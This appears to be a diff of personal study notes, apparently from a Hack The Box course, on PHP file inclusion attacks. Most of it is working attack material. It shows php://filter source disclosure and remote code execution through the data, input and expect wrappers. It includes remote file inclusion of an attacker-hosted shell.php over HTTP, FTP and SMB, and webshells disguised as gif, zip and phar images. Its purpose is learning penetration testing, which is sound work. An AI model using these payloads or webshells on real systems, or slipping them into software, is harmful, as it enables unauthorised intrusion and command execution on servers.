@@ -122,3 +122,194 @@ we should calculate the full length of the string to ensure only .php gets trunc
 Adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it.
 
 To exploit this vulnerability, we can end our payload with a null byte (e.g. `/etc/passwd%00`), such that the final path passed to include() would be (`/etc/passwd%00.php`). This way, even though .php is appended to our string, anything after the null byte would be truncated, and so the path used would actually be /etc/passwd, leading us to bypass the appended extension.
+
+## PHP Filters
+
+PHP has a built-in feature named `PHP Wrappers`. They allow developers to access different I/O stream at application level, such as stdin, stdout, etc...
+
+`PHP filters` are a special type of PHP wrappers to pass different types of input and have it filtered. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under Conversion Filters.
+
+The first step is to use `fuff` to enumerate PHP files. Normally in php LFI inclusion, the PHP gets executed and the source code cannot be seen.
+
+For example:
+
+`http://<SERVER_IP>:<PORT>/index.php?language=config` will execute the `config.php` file and we'll not see anything in the website.
+
+However, we can leverage php filter to transform the file to base64:
+
+`php://filter/read=convert.base64-encode/resource=config`:
+
+`http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config`
+
+Later, we can transform the source code using `base64 -d`:
+
+```bash
+echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
+```
+
+## PHP Wrappers
+
+There are other PHP wrappers that would be extremely useful.
+
+### Data wrapper
+
+The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the `allow_url_include` setting is enabled in the PHP configurations.
+
+First we need to check if that flag is enabled or not. In order to do so, we'll use `base64` wrapper to retrieve the files in:
+
+`/etc/php/X.Y/apache2/php.ini` for Apache or,
+`/etc/php/X.Y/fpm/php.ini` for nginx.
+
+If we don't know exactly the PHP version, we can try all of them.
+
+For example:
+
+```bash
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+```
+
+Now, we can pass the PHP code we want to execute encoded in base64 to the `data` wrapper:
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' | base64
+```
+
+`http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`
+
+And we can execute any command via PHP. We can do it via cURL:
+
+```bash
+adriangalera@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### Input wrapper
+
+Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the allow_url_include setting, as mentioned earlier.
+
+```bash
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+```
+
+Additionally, we can add the command directly into the data, e.g:
+
+```
+<\?php system('id')?>
+```
+
+### Expect wrapper
+
+Works in a similar way of the previous one, but it is external and needs to be manually installed. First, we need to check if it's configured checking for `extension=expect` in php.ini
+
+If present, the attack is straightforward:
+
+```bash
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+```
+
+## Remote File Inclusion
+
+In some cases, we are able to include not only local files, but remote files. This is very useful to the attacker, since it can host a malicious script in the machine and force the application to include it.
+
+Usually the language has some config that disables RFI completely, but in some cases it is enabled. In PHP, the config is the same as we have seen before: `allow_url_include = On`.
+
+There are some import functions vulnerable to RFI while the others don't. Refer to the table at the beginning for reference.
+
+So, the first step is to verify if we can do a RFI. Try to include a local URL:
+
+`http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`.
+
+We can use RFI to do Remote Code execution:
+
+We can craft a malicious script:
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+and host it in our machine:
+
+```bash
+sudo python3 -m http.server <LISTENING_PORT>
+```
+
+Later on, we can include our URL as the RFI to perform RCE.
+
+`http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
+
+
+We can host our file using `FTP`:
+
+```bash
+sudo python -m pyftpdlib -p 21
+```
+
+and include it:
+
+`http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`
+
+If the server is a Windows machine, we don't need the `allow_url_include`. We can use `SMB` protocol for RFI. This is because Windows treats files on remote SMB servers as normal files
+
+We can spin up a samba server using `impacket smbserver.py`:
+
+```bash
+impacket-smbserver -smb2support share $(pwd)
+```
+
+And include our URL by using a UNC path:
+
+`http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami`
+
+## LFI and file uploads
+
+If the application allows the user to upload files, this might lead to LFI. For example, an application allow the user to upload an image, however, we can upload a PHP web shell. If the importing function has `Execute` capabilities it will execute the code uploaded.
+
+```bash
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+
+We then upload this gif as our profile picture. Later in the application, we see where it is imported:
+
+```html
+<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
+```
+
+in index.php. We just need to pass the `cmd` parameter now:
+
+`http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`
+
+Something similar can be achieve with the `zip` wrapper (not enabled by default).
+
+We can create a malicious zip disguised as an image:
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+
+And use the `zip` wrapper for RCE:
+
+`http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`.
+
+We can also use the `phar` wrapper to the same.
+
+To do so, we can write a PHP script:
+
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+
+We can compile it into a `phar` file and later rename it to an image:
+
+```bash
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+
+And similarly include it:
+
+`http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`
